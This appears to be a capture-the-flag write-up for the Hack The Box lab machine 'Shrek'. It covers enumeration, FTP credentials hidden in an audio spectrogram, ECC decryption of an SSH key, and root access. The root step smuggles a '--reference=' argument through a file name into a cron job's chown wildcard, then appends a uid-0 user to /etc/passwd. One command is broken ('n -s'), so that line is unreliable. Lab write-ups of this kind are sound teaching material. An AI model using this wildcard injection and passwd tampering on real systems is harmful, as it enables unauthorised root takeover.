![logo](/logo.png)

# [Shrek- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 25 Aug 2017 machine on HTB,Shrek created by [SirenCeol](https://app.hackthebox.com/users/2277) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *spectogram
  *chrown
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/shrek 10.10.10.47
```

###### Output 

![](/Linux/Linux-Hard/Shrek/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/shrek 10.10.10.47                                                                                           ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 19:16 EAT
Nmap scan report for 10.10.10.47
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
|_http-title: Home
|_http-server-header: Apache/2.4.27 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.52 seconds
```


looking at the results  we find out that there are 3 ports open and its a `Unix`and its running an `Apache server`. 

port[21]-ftp
port[22]-ssh
port[80]-  httpd 2.4.27

so when we go the browser at [http://10.10.10.47](http://10.10.10.47) i find a shrek web browser.

![](/Linux/Linux-Hard/Shrek/Screenshots/shrek.png)

I find nothing of intresting so let me start a gobuster so that i can enumerate directories

```sh
gobuster dir -u http://10.10.10.47 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

![](/Linux/Linux-Hard/Shrek/Screenshots/gobuster.png)

i find a directory named upload and checking on it i find intresting `php`

![](/Linux/Linux-Hard/Shrek/Screenshots/uploads.png)

lets get all the files here and start looking at them one by one

```sh
wget http://10.10.10.47/uploads/ -r -np -nH --cut-dirs=1 -R "index.html*"
```

- `-r`: Recursively download files.
- `-np`: No parent; prevents `wget` from following links to parent directories.
- `-nH`: No host directories; prevents `wget` from creating a directory structure based on the domain name.
- `--cut-dirs=1`: Skips the specified number of directory levels from the beginning of the directory structure. Adjust the number based on how deep the directory structure is.
- `-R "index.html*"`: Excludes `index.html` files, which are often unnecessary.

![](/Linux/Linux-Hard/Shrek/Screenshots/wget.png)

a file named `secret_ultimate.php`. Reveal some useful information, when downloaded with it revaels about another directory named `/secret_area_51/` The file is a copy of the `php-reverse-shell.php` webshell that comes in `/usr/share/webshells/php` on Kali by default, except there’s an extra variable created at the top.

![](/Linux/Linux-Hard/Shrek/Screenshots/nanosecrete.png)

![](/Linux/Linux-Hard/Shrek/Screenshots/secrete.png)

so lets download the `mp3`  its an `All star` let me import it to audacity 

![](Linux/Linux-Hard/Shrek/Screenshots/audacity.png)


What’s interesting there is at the end the song fades out, and then there’s some extra static at the end [Wikipedia](https://en.wikipedia.org/wiki/All_Star_(song)) confirms that the song is 3:21 long, so the stuff that sounds like static at the end is definitely interesting. I’ll change it from Waveform to Spectrogram in the settings bar on the left:

![](/Linux/Linux-Hard/Shrek/Screenshots/waveform.png)

once you change spectogram the you increase the max frquency by a factor of 10 meaning being 2200 to 22000 then expand the waveform and now there’s a clear message in the noise.

![](Linux/Linux-Hard/Shrek/Screenshots/stenegrophy.png)

from their we can see the password of an ftp lets log in to the ftp with the username `donkey` and the password `d0nk3y1337!`

![](/Linux/Linux-Hard/Shrek/Screenshots/ftp.png)

There are 31 `.txt` files, and `key`

lets download all this 31 files in my local machine by doing this

```sh
mget * a
```

turned to these `.txt` files. On first glance, each of the `.txt` files contain what looks like a single base64 encoded string. Decoding it just dumps garbage. I wanted to verify that each file was a single string, so I ran `wc` on each file

```sh
wc *.txt
```

![](/Linux/Linux-Hard/Shrek/Screenshots/wc.png)

Two of the files have three words! The first one has a bunch of `base64`, some spaces, then a short base64 word, more space, and then a long one.

![](/Linux/Linux-Hard/Shrek/Screenshots/strings.png)

I open the two `.txt` i find a middle string `UHJpbmNlQ2hhcm1pbmc=` lets decode.

```sh
echo "UHJpbmNlQ2hhcm1pbmc=" |base64 -d 
```

![](/Linux/Linux-Hard/Shrek/Screenshots/echo.png)

The second file had a similar pattern, though the string in the middle was longer, and it decodes to binary data

![](/Linux/Linux-Hard/Shrek/Screenshots/wcecho.png)

```sh
echo "J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=" |base64 -d
```

![](/Linux/Linux-Hard/Shrek/Screenshots/binary.png)

I had a pretty good idea at this point that I had some cipher text and a password, but knowing what algorithm to use was kind of a random guess. It turns out that this is using ECC crypto, and there’s a Python library `seccure` (note two c’s) that will handle the decryption.

```sh
import seccure

cipher = b'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
key = b"PrinceCharming"
print (seccure.decrypt(cipher, key))

```

![](/Linux/Linux-Hard/Shrek/Screenshots/import.png)

There is a key file that can be found on the FTP server. Using the above credentials, it is possible
to SSH in.

```sh
openssl rsa -in key -out id_rsa
```

![](/Linux/Linux-Hard/Shrek/Screenshots/openssl.png)

and just way we get a ssh shell and a `user flag`

![](/Linux/Linux-Hard/Shrek/Screenshots/userflag.png)

# Privillage Escalation

I have seen a cron that is running `chown nobody:nobody *` in `/usr/src`. I can take advantage of a wildcard exploit here. There’s a great [paper on exploiting wildcards](https://www.exploit-db.com/papers/33930) in Unix (and Linux) from Leon Juranic from 2014. The issue is this. When I run `ls *`, what the shell is doing is expanding out that `*` to a list of all the files in the directory. So if I have a directory with files `a.txt` and `b.txt`, and I run `ls *`, the system ends up running `ls a.txt b.txt`.

This gets tricky if I add another file and name it `-l`. Now it runs `ls a.txt b.txt -l`, which ends up running `ls -l` and printing the details for the two `.txt` files.

As the paper shows, I can abuse this with `chown` using the `--reference=[file]` option. I can change any file on the system to be owned by any other user, as long as I have a file owned by that user to reference.

Immediately what comes to mind for me is taking ownership of a file like `/etc/passwd` as sec. I need a file to be the reference, so just create one. Then I need the file that will be interpreted as a flag. I’ll name it `--reference=test`. To create a file with this weird name, I’ll run `touch -- --reference=test`. In Linux, `--` tells the shell that anything that follows is a filename, and not an argument. With that in place, I’ll create a symbolic link to `passwd`:

```sh
n -s /home/src/.bashrc
touch -- --reference=.bashrc
ln -s /etc/passwd
```

![](/Linux/Linux-Hard/Shrek/Screenshots/symlink.png)

Now I just need to add a root user to `/etc/passwd`. I’ll create a hash

```sh
openssl passwd -1 leshack
```

![](/Linux/Linux-Hard/Shrek/Screenshots/srcpasswd.png)

Now I’ll add the string to `passwd`, with uid and gui both 0 for root

```
echo 'leshack:$1$R4pPJIGP$D288RuZhEwWJxCzrECS2L/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
```

so i log in with the created password and name as `leshack`:`leshack`

![](/Linux/Linux-Hard/Shrek/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

